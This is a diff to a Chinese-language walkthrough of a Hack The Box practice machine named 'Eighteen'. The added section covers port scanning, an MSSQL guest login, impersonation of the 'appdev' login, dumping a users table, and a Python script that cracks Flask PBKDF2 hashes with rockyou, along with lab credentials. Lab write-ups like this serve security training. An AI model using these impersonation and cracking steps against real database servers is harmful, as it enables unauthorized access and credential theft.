@@ -4,8 +4,7 @@
 机器信息:
 
 	像现实生活中常见的 Windows 渗透测试一样，你将使用以下账户凭证启动 Eighteen 盒子：kevin/iNa2we6haRj2gaw!
-
-## 端口扫描
+#### 端口扫描
 
 ```
 $ nmap -sC -sV -vv -oA 10.129.156.245
@@ -63,3 +62,76 @@ Host script results:
 |_clock-skew: 7h00m03s
 ```
 - **域名**: `eighteen.htb`
+## 初始访问
+
+### MSSQL 枚举
+#### SQL 身份验证（访客访问）
+```BASH
+impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
+```
+**结果**：以 `guest` 身份连接，权限有限。
+#### 枚举登录
+
+```SQL
+-- 检查当前用户
+SELECT SYSTEM_USER, USER_NAME();
+
+-- 列出数据库
+SELECT name FROM master.dbo.sysdatabases;
+```
+#### 发现模拟权限
+
+```SQL
+enum_impersonate
+```
+
+**关键发现**：Kevin 可以假冒 `appdev` 登录!
+#### 模拟 appdev 并访问数据库
+
+```SQL
+-- 冒充 appdev
+EXECUTE AS LOGIN = 'appdev';
+
+-- 核实
+SELECT SYSTEM_USER, USER_NAME();
+
+-- 访问 financial_planner 数据库
+USE financial_planner;
+
+-- 列出表格
+SELECT name FROM sys.tables;
+```
+### 提取用户凭证
+
+```SQL
+SELECT * FROM users;
+```
+### 破解密码哈希
+
+创建了一个 Python 脚本来破解 Flask PBKDF2 哈希：
+
+```PYTHON
+#!/usr/bin/env python3
+import hashlib
+import gzip
+from multiprocessing import Pool, cpu_count
+
+def check_password(args):
+    password, salt, iterations, target_hash = args
+    try:
+        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
+        if computed.hex() == target_hash:
+            return password.decode('utf-8', errors='ignore')
+    except:
+        pass
+    return None
+
+# Hash components
+salt = "<REDACTED_SALT>"
+iterations = 600000
+target_hash = "<REDACTED_HASH>"
+
+# Run against rockyou.txt with multiprocessing
+```
+
+**破解密码**：iloveyou1
